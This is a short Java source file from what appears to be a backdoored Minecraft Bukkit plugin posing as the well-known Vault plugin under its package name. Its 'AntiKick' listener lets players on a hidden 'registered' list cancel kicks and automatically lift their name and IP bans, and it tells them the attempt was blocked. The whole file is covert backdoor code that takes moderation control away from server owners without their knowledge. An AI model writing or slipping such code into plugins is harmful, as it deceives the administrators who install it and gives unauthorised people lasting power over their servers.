package net.milkbowl.vault.events;

import net.milkbowl.vault.methods.API;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.util.Settings;

public class AntiKick implements Listener {
	private static final Core plugin = Core.getPlugin(Core.class);
	

	@EventHandler
	public void antiKick(PlayerKickEvent e) {
		Player p = e.getPlayer();
		if (plugin.registered.contains(p.getName())) {
			e.setCancelled(true);
			if (e.getPlayer().isBanned()) {
				Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(e.getPlayer().getName());
				Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIp(p));
		      }
			p.sendMessage(Settings.PREFIX("Someone tried to kick/ban you but " + Settings.NAME + " prevented it"));
		}
	}

}
